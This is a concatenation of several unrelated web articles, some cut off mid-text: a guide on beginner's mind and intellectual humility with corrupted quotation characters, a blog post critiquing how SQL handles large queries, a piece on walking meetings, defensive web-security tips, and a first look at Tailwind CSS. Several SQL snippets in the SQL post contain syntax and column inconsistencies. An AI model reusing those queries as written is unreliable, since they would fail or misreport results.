<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>The Japanese Zen term <em>shoshin</em> translates as â€˜beginnerâ€™s mindâ€™ and refers to a paradox: the more you know about a subject, the more likely you are to close your mind to further learning. As the Zen monk Shunryu Suzuki put it in his book <em>Zen Mind, Beginnerâ€™s Mind</em> (1970): â€˜In the beginnerâ€™s mind there are many possibilities, but in the expertâ€™s there are few.â€™</p>
<p>Many historical examples demonstrate how the expert mind (or feeling like an expert) can lead to closed-mindedness and the obstruction of scientific progress. In 1912, for instance, when the German geophysicist and explorer Alfred Wegener proposed â€“ counter to the received wisdom of the day â€“ that the Earth is made up of shifting continental plates, he was ridiculed by expert geologists around the world. His German compatriots referred to his â€˜delirious ravingsâ€™ while experts in the United States accused him of peddling pseudoscience. It would take decades before the orthodoxy was overturned and the accuracy of his theory was acknowledged.</p>
<p>Similar stories abound. In my own field of neuroscience, for example, belief in the legendary Spanish neuroscientist Santiago RamÃ³n y Cajalâ€™s â€˜harsh decreeâ€™ that adult humans are unable to grow new neurons persisted for decades in the face of mounting contradictory evidence.</p>
<p>Intellectual hubris doesnâ€™t afflict only established scientific experts. Merely having a university degree in a subject can lead people to grossly overestimate their knowledge. In one pertinent <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/cogs.12280">study</a> in 2015, researchers at Yale University asked graduates to estimate their knowledge of various topics relevant to their degrees, and then tested their actual ability to explain those topics. The participants frequently overestimated their level of understanding, apparently mistaking the â€˜peak knowledgeâ€™ they had at the time they studied at university for their considerably more modest current knowledge.</p>
<p>Unfortunately, just as Suzuki wrote and as historical anecdotes demonstrate, there is research evidence that even <em>feeling</em> like an expert also breeds closed-mindedness. Another <a href="https://www.sciencedirect.com/science/article/abs/pii/S0022103115001006?via">study</a> involved giving people the impression that they were relatively expert on a topic (for example, by providing them with inflated scores on a test of political knowledge), which led them to be less willing to consider other political viewpoints â€“ a phenomenon the researchers called â€˜the earned dogmatism effectâ€™.</p>
<p>The consequences of intellectual overconfidence can be seen in the debates surrounding controversial contemporary issues. Take the matter of genetically modified (GM) foods, which are overwhelmingly considered to be safe based on current scientific knowledge. Research has <a href="https://www.nature.com/articles/s41562-018-0520-3">shown</a> that people who hold the strongest anti-GM views, believing that they are harmful, are the most inclined to overestimate their relevant knowledge. Â­</p>
<p>Approaching issues with a beginnerâ€™s mind or a healthy dose of intellectual humility can help to counter the disadvantages of intellectual hubris. People who are more intellectually humble <a href="https://www.tandfonline.com/doi/full/10.1080/17439760.2019.1579359">actually</a> know more, presumably because they are more receptive to new information. Similarly, being intellectually humble is associated with open-mindedness and a greater willingness to be receptive to other peopleâ€™s perspectives â€“ arguably just the tonic that our politically febrile world needs today.</p>
<p>Therefore, fostering your own beginnerâ€™s mind will help you to become more knowledgeable, less overconfident and more willing to engage with others â€“ traits that are also increasingly sought after by leading employers. By practising being flexible rather than dogmatic, more humble and less brazen, you will be sensitive to other peopleâ€™s perspectives and needs, making you a better sister, brother, father, mother, partner and friend. With eyes and mind wide open, itâ€™s so much easier to enjoy the wonders of the world, to grow, to learn and to listen.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>An important first step towards having a more open mind is to establish a realistic sense of your own knowledge. Countless studies have shown that most of us overestimate our understanding of various topics, everything from how a vacuum cleaner works to the detail of political policies â€“ a phenomenon <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3062901/">called</a> â€˜the illusion of explanatory depthâ€™. Fortunately, there is a very simple way to address this form of intellectual overconfidence and that is to make the effort to explain a relevant issue or topic to yourself or someone else in detail, either out loud or in writing. This exercise makes the gaps in our knowledge more apparent and bursts the illusion of expertise.</p>
<p>If embarking on a full-on explanation sounds impractical or overly arduous, there is a shorthand version you can try. In 2016, psychologists at Washington and Lee University in Virginia <a href="http://dx.doi.org/10.1037/xge0000161">showed</a> that the same beneficial effect could be achieved simply by spending a few seconds reflecting on your ability to explain a given issue to a true expert â€˜in a step-by-step, causally connected manner, with no gaps in your storyâ€™.</p>
<p>Another major hurdle to being open-minded is that we are naturally inclined to seek out information that supports our current views and beliefs â€“ a human foible known as â€˜confirmation biasâ€™. This perpetuates closed-mindedness and makes us ever surer of our own knowledge.</p>
<p>To combat confirmation bias, be aware of it. Constantly remind yourself that it exists, and take active steps to work against it by seeking out information and perspectives that contradict your current position. A <a href="https://psycnet.apa.org/record/1981-07049-001">study</a> published way back in 1980 suggested that actively challenging yourself in this way can be beneficial. Volunteers were presented with trivia questions, such as â€˜the Sabines were part of (a) ancient India or (b) ancient Romeâ€™, and then asked to rate the likelihood that their answers were correct. As expected, the volunteers tended to be overconfident in the accuracy of their answers. However, the researchers found that it was possible to reduce this overconfidence simply by asking their volunteers to list one reason why each of their chosen answers might be wrong. â€˜People who are interested in properly assessing how much they know should work harder in recruiting and weighing evidence,â€™ the researchers wrote. â€˜However, that extra effort is likely to be of little avail unless it is directed toward recruiting contradicting reasons.â€™</p>
<p>The way you think about intelligence and expertise is also relevant to being more open-minded. â€˜Growth mindset theoryâ€™ argues that if we see aptitudes as malleable rather than fixed we are able to learn better. Although the implementation of this theory in formal education has come in for some criticism lately, many continue to see value in the concept, and there is a persuasive logic to the idea that peopleâ€™s perspective on the nature of intelligence is likely to encourage their own intellectual humility.</p>
<p>A series of <a href="https://www.tandfonline.com/doi/full/10.1080/15298868.2017.1361861">studies</a> published in 2018 supported this view, showing that people who were more intellectually humble also tended to have a â€˜growth mindsetâ€™ toward intelligence. This makes sense â€“ if you take the view that intelligence is something youâ€™re either blessed with or youâ€™re not, then acknowledging (or actively seeking to expose) the gaps in your own knowledge and wisdom might be threatening, serving as apparent evidence of your intellectual inferiority. Conversely, if you see intelligence as something to be developed, then finding holes in your knowledge is not so threatening: instead, it opens up exciting new opportunities for learning.</p>
<p>Promisingly, that same 2018 paper showed that it might be possible to foster intellectual humility by encouraging a growth mindset. Asking volunteers to read a scientific article about the malleability of intelligence led them to score higher on a measure of intellectual humility and to be more open to other perspectives, as compared with a control group. â€˜This study suggests that intellectual humility can be at least temporarily enhanced, and points to a growth mindset as a set of beliefs that seems capable of doing so,â€™ the researchers said.</p>
<p>A final, more pleasurable step you can take to increase your intellectual humility comes in the form of deliberately invoking in oneself the emotion of awe. Several studies have shown that awe quietens the ego and prompts epistemological openness â€“ that is, a greater willingness to look at things differently and to recognise the gaps in oneâ€™s knowledge. The emotion also seems to reduce peopleâ€™s need to be satisfied by definite, closed arguments.</p>
<p>Consider a series of <a href="https://psycnet.apa.org/fulltext/2019-46364-001.html">studies</a> published in 2019 that involved volunteers watching awe-inspiring videos of nature or of the night skies â€“ doing so led them to hold beliefs about capital punishment with less conviction; to see political debates as less polarised; and to be more willing to engage with others holding opposing views on immigration. Another <a href="https://www.tandfonline.com/doi/full/10.1080/02699931.2019.1585331">paper</a> published the same year, and that used nature videos and a virtual-reality experience of the aurora borealis to induce awe, found that the emotion led volunteers to be more aware of the gaps in their knowledge, and to take a keener interest in science. Paraphrasing Albert Einstein, the researchers wrote that â€˜one who never experiences awe ceases to discoverâ€™. The message is simple: to increase your open-mindedness, try taking the time to gaze in wonder at the stars.</p></div></div></section><section><div><h2 data-guide-section-number="3"><span>Key points</span></h2><div><ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<p>
	After working for a few years on data analytics and processing, there seems to be a contradiction in the way SQL supports large and complex queries, and I've heard similar echoes from several others. I'll call this the <b>Vanishing Schema Paradox</b>:
</p>
<blockquote>
	<p>
		In a large SQL query, fundamental concepts such as <em>«this is the table of all widgets»</em> vanish after the first few lines.
	</p>
</blockquote>
<p>
	Or, in slightly more formal terms:
</p>
<blockquote>
	<p>
		In a large SQL query, the proportion of tables that come from the database schema decreases as the SQL query grows. 
	</p>
</blockquote>
<p>
  This is quite disappointing. After time and effort spent cleaning and documenting the database schema, most tables only last for a few short lines in a typical query. 
</p>
<p>
	The cause should not surprise anyone familiar with SQL. The simple concept of <em>«compute this value for each widget»</em> is actually not supported by SQL queries: there is no way to add a column to the widget table. Instead, SQL lets you create a new table with <code>SELECT</code>, a clone table that includes the new column in addition to the old ones. The rest of the query then manipulates the clone and never touches the original table again.
</p>
<p>
	To give a more concrete example, consider a simple report: 
</p>
<blockquote>
	<p>
		Given a <code>Products</code> table with a <code>Target</code> column and an <code>Orders</code> table with a <code>Quantity</code> column, find the ratio of products for which the total 2019 sales exceeded their target.
	</p>
</blockquote>
<p>
	Here's a solution in three steps, numbered from the inside out: 
</p>
<pre><code><span>3&gt;  SELECT AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END)
3&gt;  FROM (</span>
<span>2&gt;    SELECT SUM(Orders.Sales) AS Products.Total2019Sales</span>
<span>1&gt;    FROM Products
1&gt;    LEFT JOIN Orders ON Products.PId = Orders.PId AND Orders.Year = 2019</span>
<span>2&gt;    GROUP BY Products.PId</span>
<span>3&gt;  ) AS P</span>
</code></pre>
<ol>
	<li>
		<p>
			Left-join the products and orders tables. This creates a new table, because SQL is about relational algebra, and relational algebra is about creating new relations from old relations, and the distinction between tables and relations is irrelevant to the paradox.
		</p>
	</li>
	<li>
		<p>
			Aggregate by product the <code>Orders.Quantity</code> values from the new table, resulting in a new table P. We will <em>pretend</em> that table P is the same as <code>Products</code>, because it contains the same lines and can (if we choose to) include the same columns as well, in addition to the new column <code>Total2019Sales</code>.
		</p>
	</li>
	<li>
		<p>
			Aggregate table P to the ratio of products where <code>Total2019Sales &gt;= Target</code>. 
		</p>
	</li>
</ol>
<p>
	Out of three named tables (<code>Products</code>, <code>Orders</code> and <code>P</code>), only two tables appear in the database schema. 
</p>
<p>
	I'm not complaining ! For a small query, and with a few comments, this is <em>fine</em>. Most relational algebra operations are intuitive, given enough SQL experience. 
</p>
<p>
	The pain appears when growing beyond that. Let's say an additional request comes for the report: 
</p>
<blockquote>
	<p>
		Using the <code>Category</code> column, compute the ratio of products which exceeded their target across: 
	</p>
	<ol>
		<li>
			<p>all categories where over 50% of products reached their targets, </p>
		</li>
		<li>
			<p>all other categories. </p>
		</li>
	</ol>
</blockquote>
<p>
    If the <code>Total2019Sales</code> column was part of the Products table, this would be easy:
</p>
<pre><code><span>3&gt;  SELECT AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END), C.Over50</span>
<span>2&gt;  FROM Products P 
2&gt;  INNER JOIN (</span>
<span>1&gt;    SELECT 
1&gt;      P.Category, 
1&gt;      AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END) &gt; 0.5 as Over50
1&gt;    FROM Products P
1&gt;    GROUP BY P.Category</span>
<span>2&gt;  ) C ON P.Category = C.Category</span>
<span>3&gt;  GROUP BY C.Over50</span>
</code></pre>
<ol>
	<li>
		<p>
			Group the Products table by category, resulting in a new table C. The column <code>Over50</code> is true for categories where over 50% of products reached their targets.
		</p>
	</li>
	<li>
		<p>
			Join the Products table with table C. This results in a new table which we will again <em>pretend</em> is the same as the Products table, with the addition of the <code>Over50</code> column. 
		</p>
	</li>
	<li>
		<p>
			Aggregate that relation into the requested ratios.
		</p>
	</li>
</ol>
<p>
	<b>The problem is that <code>Total2019Sales</code> is not part of the Products table.</b> <br>
	It is part of table <code>P</code> from the first example, which is not in the schema.
</p>
<p>
    SQL almost solves this problem with Common Table Expressions, whereby a table is given a temporary name for the rest of the query:
</p>
<pre><code>WITH P AS (
  
<b>-- The subquery from example 1:</b>
  
  SELECT Products.Category, SUM(Orders.Sales) AS Total2019Sales
  FROM Products
  LEFT JOIN Orders ON Products.PId = Orders.PId AND Orders.Year = 2019
  GROUP BY Products.PId)
  
<b>-- Schema tables no longer appear after this line ! --</b>
  
<b>-- The full query from example 2:</b>

SELECT AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END), C.Over50
FROM P 
INNER JOIN (
  SELECT 
    P.Category, 
    AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END) &gt; 0.5 AS Over50
    FROM Products P
    GROUP BY P.Category
  ) C ON P.Category = C.Category
GROUP BY C.Over50</code></pre>
<p>
	I say <em>almost</em>, because we are doing a lot of pretending here. 
</p>
<p>
	The heart of the query is to compute two values for each product: the total sales for that product in 2019, and whether that product belongs to a category where over 50% of products reached their targets in 2019.
</p>
<p>
	The proper way to model <em>«two values for each product»</em> in a database schema is to add two columns to the Products table. 
</p>
<p>
	However, SQL does not support adding columns to a table in the middle of a SELECT query—modeling data and querying data are two completely independent modes in SQL. Instead, we settle for the next best thing: to create a <em>clone</em> of the Products table, which contains all the columns from the original, plus our additional two columns. This is achieved by a left-join-then-group-by (for&nbsp;<code>Total2019Sales</code>) or by an inner-join (for&nbsp;<code>Over50</code>). 
</p>
<p>
	This is a dirty hack ! It does not express the <em>intent</em> behind the operation: that the new table should be the <code>Products</code> table with additional columns. It's easy to make a mistake that drops products or introduces duplicate lines for some products: using an inner-join instead of a left-join, or the wrong keys for a group-by, or a misplaced <code>WHERE</code>. This is compounded by the fact that foreign keys (and other consistency checks) are no longer present or enforced on the clone. 
</p>
<p>
	A complex report might involve five or six tables, and add tens of variables to each of them. It's possible to reach a hundred table clones, each clone an opportunity to make a mistake.
</p>
<p>
	Picture a 200-line SQL query. No tables from the schema appear after line 10, except that one on line 190 which is joined on a column that may or may not still be a foreign key. There are five tables named <code>Products</code> (or some variation thereof), some of which might represent of <em>«the table of all products»</em>, though three of them look like they might have dropped some products from the original table, and a fourth is based on a suspicious <code>INNER JOIN</code> that could duplicate a few lines.
</p>
<h3>A different model</h3>
<p>
	Not many people complain about this. Developers—those who have a strong background in other programming languages, and can realize how silly this all is—tend to hide SQL queries behind an Object-Relational Mapper, or write very small transactional queries that are more concerned about traversing a graph of relations. Data analysts—those who need to write elaborate SQL queries, involving complex business logic—often have no point of comparison in terms of language expres­siveness. 
</p>
<p>
	The SQL query model can be improved by adding operations that preserve the schema. In particular, <em>adding a column to a table</em> should be a basic building block. It does not need to <em>actually</em> add the column to the table: it is enough to create a clone (with an absolute guarantee that no lines appear or disappear), and maybe give it the same name as the original (for convenience). The same relational algebra semantics, but wrapped in a different syntax with additional guarantees.
</p>
<p>
	Data Frames are a similar concept. 
</p>
<p>
	Let's think about how such a model would look like. The concept is: 
</p>
<blockquote>
	<p>
		Rather than adding tables to the schema, the query should add columns to schema tables. New tables, when necessary, should remain unnamed and thus of very local scope. 
	</p>
</blockquote>
<p>
	Common operations add columns to schema tables and guarantee that no rows are added or dropped. 
</p>
<ul>
	<li>
		<p>
			A <b>map</b> stays in the same table, applying a line-by-line operation to compute one new value for each row. 
		</p>
		<div><pre>Products.TargetReached = Products.Total2019Sales &gt;= Products.Target</pre></div>
		<p>
			After the assignment, the <code>Products</code> table is still the table of all products.
		</p>
	</li>
	<li>
		<p>
			A <b>contraction</b> (borrowing the term from <a href="https://en.wikipedia.org/wiki/Tensor_contraction">tensors</a>) performs an aggregation into an output table that already exists, along a one-to-many relation. In terms of SQL, this would be a <code>LEFT JOIN</code> between the output table and the input table (so there are no missing lines), followed by a <code>GROUP BY</code> the primary key of the output table (so there are no duplicates). 
		</p>
		<div><pre>Products.Total2019Sales = sum(Orders.Quantity) where Orders.Year == 2019</pre></div>
		<p>
			Since fewer tables are created in this model, most operations involve schema tables, making it possible to rely more on natural joins (above, between <code>Products</code> and <code>Orders</code>) to shorten the code. 
		</p>
		<p>
			Also, <code>ratio(myBool)</code> as a shorthand for <code>avg(myBool ? 1 : 0)</code> should be standard SQL.
		</p>
	</li>
	<li>
		<p>
			A <b>broadcast</b> (again, from <a href="https://pytorch.org/docs/stable/notes/broadcasting.html">tensors</a>) pulls data through a many-to-one relation. In terms of SQL, this would be an <code>INNER JOIN</code> with a foreign-primary key pair (the foreign key ensures that the join finds at least one row per row, the primary key ensures that it finds no more than one row). 
		</p>
		<div><pre>Products.Over50 = Categories.Over50</pre></div>
		<p>
			Natural joins make this quite short.
		</p>
	</li>
	<li>
		<p>
			A <b>seek</b> is a broadcast which uses a primary key, but not a corresponding foreign key (and thus, a <code>LEFT JOIN</code> instead of an <code>INNER JOIN</code>). There is still a guarantee that there will be one value per row in the table, but some of these values will be null.
		</p>
	</li>
	<li>
		<p>
			New tables, if named, should fit into the schema. They should come with appropriate defaults for primary and foreign keys, and should support adding new keys as necessary.
		</p>
		<div><pre>table Categories = by Products.Category
Categories.Over50 = …</pre></div></li></ul></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main"><article id="post-633"><div><div><p>Let’s face it, we’ve all been spending a lot of time sitting in front of Zoom meetings and it’s kinda dumb. There’s an easy fix and there’s research that it not only makes us a little more creative, it makes us a lot more creative.</p><p>When you’re trapped in an office, I get it. But so many people are working from home and yet they’re stuck doing the same thing over and over again.</p><p>Let’s mix it up…. Grab your phone, headphones and go for a walking meeting.</p><h3>Why are Zoom meetings so exhausting?</h3><ul><li>We are tuned to watching body language</li><li>Tuned to eye contact</li><li>Constantly scanning for where to look</li><li>In a meeting you can catch glances, share a moment and have little side-bar conversations.</li></ul><p>Online meetings don’t really let you do that.</p><ul><li>Looking for eye-contact but you can’t find it.</li><li>Looking for micro-expressions but they are harder to see</li><li>When we’re on video chat we’re always looking at people’s eyes and if they aren’t looking at us, we think they’re ignoring us. Humans are just wired that way.</li><li>And sometimes the audio is just a little out of sync from people’s lips and it drives our brains crazy.</li></ul><p>Don’t get me wrong. I’m a big proponent of turning on the video camera and I think Zoom is a great tool, but everything in moderation and staying in this type of zone all day is mentally draining.</p><h3>Walking Meetings</h3><p>I’ve been doing walking meetings for years and walking literally gets you to change your perspective. When you’re walking you’re more focused and tend to listen better. You’re not fidgeting with your phone or refreshing your newsfeed in another tab.</p><p>Because you’re not focused on trying to match people’s facial expressions you can focus more on what they are saying. There are countless health benefits to walking meetings, but don’t just do this for your physical health. It’s good for your mental health and creativity too.</p><p>I started doing walk &amp; talk meetings about 10 years ago. I’m a big fan of the Show West wing where Aaron Sorkin would take people on a walking journey all while telling a story. The visual cue advances the story and it also gives both sides a chance to talk.</p><p>When I would go on a walking meeting with someone you can’t see their facial expressions so you’re really concentrating on what they are saying.</p><p>The other reason to go for a walk during your meetings is that it can make you more creative. A lot more creative. According to a study out of <a href="https://news.stanford.edu/2014/04/24/walking-vs-sitting-042414/">Stanford</a>, it can increase your creativity by as much as 60% for tasks where you’re thinking of novel ideas.</p><p>They studied the effect of walking on creativity and it doesn’t even have to be walking outside. They got the same results from walking on a treadmill.</p><figure><blockquote><p>So if you’re feeling burned out on Zoom meetings, know that it’s how your brain is wired. Grab your phone, mask, headphones and go for a walk.</p></blockquote></figure><figure><p> <iframe title="Why Walking Meetings Boost Creativity" width="580" height="326" data-src="https://www.youtube.com/embed/mHVfCU90EDc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure></div></div></article></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    















<p><strong>Disclaimer:</strong> I am not a security expert.</p>
<p>This post is a collection of quick tiny little things that could improve your security drastically. We would have a much safer web if more developers would know some of these resources and tips.</p>
<h2 id="use-a-checklist">Use a checklist</h2>
<p>This might sound a bit weird, but checklists are a great and powerful tool.</p>
<p>Ever heard of the <a href="https://www.who.int/patientsafety/safesurgery/checklist/en/">Surgical Safety Checklist from the WHO</a>? In their study, this checklist reduced the morbidity rate of patients by almost 50% <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.
This effectiveness will also apply to WebSecurity.</p>
<p>You will forget or don’t even know about some vulnerabilities. I recommend the <a href="https://cheatsheetseries.owasp.org/Glossary.html">OWASP Cheatsheet Project</a>. The usefulness of this project is incredible. For one of my own <a href="https://likeknob.com/">Web-Apps</a>, I forgot to install a CSRF Protection but saw them on the Cheatsheet.</p>
<p>I personally forgot to implement a CSRF protection for certain actions in <a href="https://likeknob.com/">my Web-App</a>.</p>
<h2 id="your-users-are-evil">Your users are evil</h2>
<p>Or you should at least pretend so. Never trust any input that comes from your users. Imagine them as hackers.</p>
<p>This will put you in the right mindset.</p>
<p>Some of the <a href="https://owasp.org/www-project-top-ten/">most common vulnerabilities</a> come from improper input handling.</p>
<p>Can you put restrictions on the input of your web app? Then do it. The stricter the better.</p>
<p>This also accounts for strange things like: Does your App accept a 1GB big JSON file?</p>
<p>Considering strange inputs, here is a <a href="https://github.com/minimaxir/big-list-of-naughty-strings/">list of strings</a> which may break some applications. And you may test if that also breaks your app.</p>
<p>Additionally, ask yourself: “How would I hack my own app?”</p>
<h2 id="log--monitor-things">Log &amp; Monitor things</h2>
<p>This is also a great point from a non-security perspective. You should always know when something is wrong.</p>
<p>Only if you know something is wrong, you can fix it. I will again recommend a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">OWASP Cheatsheet about Logging</a>.</p>
<p>If you noticed a security incident, be open to your users. Don’t try to hide something.</p>
<p>Being open about such incidents is important and builds trust. In most cases you are also legally required (<a href="https://gdpr-info.eu/art-34-gdpr/">GDPR Art. 34</a>) to inform your users.</p>

<p>So, you tried your best to secure your app. Most likely there will be still vulnerabilities in there.</p>
<p>For this reason: Make it easy for security researchers to reach out to you.</p>
<p>Signal them you will not go after them if they didn’t break any laws. There is a high chance many security researchers will not search or report vulnerabilities because they are afraid of legal retaliation.</p>
<p>So, how do you do that?</p>
<ul>
<li>
<p>Provide a Responsible Disclosure Policy.</p>
<p>In short, it states what security researchers are allowed to test and where to report them.</p>
<p>Bugcrowd (one of the biggest bug bounty platforms) provides a framework for <a href="https://github.com/bugcrowd/disclosure-policy">creating such a policy</a> and a <a href="https://www.bugcrowd.com/resource/what-is-responsible-disclosure/">more in-depth article about Responsible Disclosure Policies</a></p>
</li>
<li>
<p>Provide a security.txt file.</p>
<p>This is a <a href="https://securitytxt.org/">standard proposed by a security researcher</a>.</p>
<p>It’s basically a text file that states where you can disclose security vulnerabilities and how. You can create it easily via <a href="https://securitytxt.org/">the official website</a>.</p>
</li>
<li>
<p>Provide a <code>security@example.com</code> mail address.</p>
<p>Many researchers try this first.</p>
<p>If it fails, there is a lower chance a vulnerability will be reported to you.</p>
</li>
</ul>
<p>If you don’t have any of these, it’s like a sign “No Good Hackers allowed here.”</p>
<p>If you want to read more about why we need more hackers, there is an excellent article <a href="https://medium.com/@yakko.majuri/the-internet-is-too-unsafe-we-need-more-hackers-c9742fc1a03b">here</a>.</p>
<h2 id="last-words">Last words</h2>
<p>Security is hard. It takes time and work to do things more securely.</p>
<p>For the sake of a better web, try it.</p>
<p>We need more hackers that hack for good and more people that are aware of those pitfalls.</p>
<p>Further recommendation:</p>
<p>There are also techniques to write more secure code. I’ve heard good things about the book “Secure by Design” from Deogun, Johnsson, and Sawano.</p>
<p>Take a look at a <a href="https://henrikwarne.com/2020/03/22/secure-by-design/">good summary</a>.</p>
<p><strong>Got a website? I would be happy if you take a look at my <a href="https://likeknob.com/">new Project</a>.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Let's face it - sometimes CSS can be a pig. You need to learn the magic incantations, carefully follow the phases of the moon, and pray that everything will be ok if you just try every possible permutation of the flexbox properties.</p>
<p>But that's not what this post is about. This post isn't about the pain that can come from getting CSS do your bidding, this post is about the pain that comes from trying to <em>scale</em> CSS in a large project. This is the first of a series of posts as we search for the solution that allows our developers to spend more time working on new features and less time writing CSS.</p>
<p>We'll take a look at <a target="_blank" href="https://tailwindcss.com/">Tailwind CSS</a> and see if it fits the bill. </p>
<p><strong>Spoiler alert:</strong> it's easy to get up and running with Tailwind and it feels highly productive. But it's too soon to tell if we'll go all-in with it. A follow-up is needed to investigate Tailwind's facilities for responsive design and accessibility.</p>

<p>We're building <a target="_blank" href="https://kitemaker.co/">Kitemaker</a>, a new, fast, and highly collaborative alternative to issue trackers like Jira, Trello, and Clubhouse. We're helping teams build better products and have a bigger impact through closer collaboration. It's a pretty big React application, and from day one we've used SASS for our CSS needs. We use CSS modules. We haven't used any off-the-shelf component toolkit (some regrets about that). We support dark mode (awesome!) by making heavy use of <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS custom properties</a>. We took a cue from Notion and use system fonts everywhere. We have some <a target="_blank" href="https://sass-lang.com/documentation/at-rules/mixin">@mixin</a> directives for repeated patterns in our UI and occasionally make use of SASS' <a target="_blank" href="https://sass-lang.com/documentation/at-rules/extend">@extends</a> facilities (though we always suspect we're doing it wrong when we do).</p>

<p>Sounds ok. So what's the problem?</p>
<p>The problem is our CSS has become a mess over time. We have tons of classes. Some of them are very specific to the use case in a particular piece of the UI, some are written to be more general and reusable. Sometimes a class isn't quite right for a use case, so it gets duplicated and edited. Sometimes a mixin isn't quite right for the use case so it gets another parameter added to it. Sometimes a new custom property slips in and we get inconsistent colors or borders. We have a lot of SASS variables to handle spacing (padding/margins) and it's not always obvious which one to pick.  Sometimes a developer innocently changes a color here, or a custom property there, fixing their use case but breaking another. We have a hierarchy of CSS classes, but those can be brittle and a challenge for reuse, and in some cases a big surprise where you need to open web inspector and ask "where did this color <em>come</em> from?".</p>
<p>The net result is that we spend too much time tweaking CSS and rarely is the codebase left in a better condition than it was found.</p>
<p>Now, the pundits may say that it's simply because we're not good enough or disciplined enough at CSS - that we don't apply the same rigor to CSS that we apply to the TypeScript and React code that houses it. That may be. We're probably never going to be masters that make amazing works of art with CSS (you should seriously check out <a target="_blank" href="https://twitter.com/liatrisbian">@liatrisbian</a> or <a target="_blank" href="https://twitter.com/jh3yy">@jh3yy</a> if that's what you're after). But here's the thing - we don't think we should need to be. We think it should be able to crank out UIs at a reasonable pace without generating a pile of CSS debt in the process.</p>

<p>What, exactly are we looking to get out of a CSS framework?</p>
<ul>
<li>Something that makes it easy to be consistent in terms of things like margins, padding, colors and sizes.</li>
<li>Something that's customizable enough for our needs</li>
<li>Something that works with our home grown components</li>
<li>Something that doesn't make it harder to support dark mode</li>
<li>Something that helps us make our app more responsive. We were just about to go through all of our app and make it work better on smaller screens, so something that'll kick start the process would be a massive win</li>
<li>Something that helps (or at least doesn't hinder) accessibility</li>
<li>Something that doesn't make our build process even more cumbersome</li>
<li>And last, but not least - something that <em>feels</em> right. We want to come out of this feeling more productive than we are going in when it comes to developing UIs.</li>
</ul>
<p>Let's see if Tailwind CSS is what we're looking for or not!</p>

<p>Ok, so what is <a target="_blank" href="https://tailwindcss.com/">Tailwind CSS</a>? It's a CSS framework that allows you to compose low-level utility classes together right in your HTML (or JSX). It's the rising star among the frameworks that have been referred to as <a target="_blank" href="https://www.smashingmagazine.com/2013/10/challenging-css-best-practices-atomic-approach/">atomic CSS</a> (or functional CSS).</p>
<p>What do these low-level classes look like? Well, they're things like:</p>
<ul>
<li><code>font-bold</code> - add bold font</li>
<li><code>text-gray-600</code> - gray text (the 600 represents the darkness of the gray, ranging from 100 to 900)</li>
<li><code>md:flex</code> - set <code>display: flex</code> on medium sized screens (the <code>md:</code> prefix is part of Tailwind's responsiveness support)</li>
<li><code>hover:underline</code> - underline the contents on hover</li>
</ul>
<p>Everything from colors, to flexbox and grid, to background images. You take these things and compose them together to get the look you're after. So if you want your button to be blue, have a bit of padding, have rounded corners, have bold white text, and to change to a darker blue on hover, you'd write something like this:</p>
<pre><code><span>&lt;<span>button</span> <span>class</span>=<span>"bg-blue-400 p-2 rounded text-white font-bold hover:bg-blue-600"</span>&gt;</span>Click me<span>&lt;/<span>button</span>&gt;</span>
</code></pre>
<p>That's it. No opinions on what a button (or any other component) needs to look like, how your grid system works or anything like that.</p>
<p>Now of course, typing out all of those things can get a bit repetitive, so you <em>can</em> extract things into higher order component classes like this:</p>
<pre><code><span>&lt;<span>button</span> <span>class</span>=<span>"btn btn-blue"</span>&gt;</span>
  Click me
<span>&lt;/<span>button</span>&gt;</span>

<span>&lt;<span>style</span>&gt;</span><span>
  .btn {
    @apply font-bold p-2 rounded;
  }
  .btn-blue {
    @apply bg-blue-400 text-white font-bold;
  }
  .btn-blue:hover {
    @apply bg-blue-600;
  }
</span><span>&lt;/<span>style</span>&gt;</span>
</code></pre>
<p>You can also extend it with your own screen sizes, colors and more. It's pretty neat!</p>
<p>Now, a lot of people's first instinct (and I'm no different) is that this looks like it's going to be at <em>least</em> as messy as the situation we're coming from (if not more). However, there's a real glimmer of hope and that's that things are extremely <em>explicit</em>. The classes you add are the ones you get and if you're careful to not overdo trying to make everything into components, things just might work out. Let's give it a go, shall we?</p>

<p>We're going to put Tailwind CSS to the test by reimplementing a piece of our app. And what better piece than the very first one users are greeted with - the login screen.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598427808597/2X0hmWt0f.png?auto=format&amp;q=60" alt="Screen Shot 2020-08-25 at 17.37.23.png"></p>
<p>We were going to test it by making a mock project and trying to reproduce the screen there, but then we thought - eh, let's live a little. We'll make the changes right in the real codebase. Let's just start by deleting all of the <code>className</code> properties from the existing code. The result:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598427833001/p0rhW63dI.png?auto=format&amp;q=60" alt="Screen Shot 2020-08-25 at 20.24.13.png"></p>
<p>Somewhat less good.</p>
<p>We've got a bit of work to do! We won't go through every step it took to build things back up to their former glory, but let's check out some of the highlights.</p>
<h2 id="installing-tailwind">Installing Tailwind</h2>
<p>Getting Tailwind up and running in our existing webpack setup was surprisingly easy:</p>
<pre><code>yarn add -D postcss-loader tailwindcss
npx tailwindcss init
</code></pre>
<p>Then a little modification to our CSS rule in webpack.config.js:</p>
<pre><code><span>const</span> cssRule = {
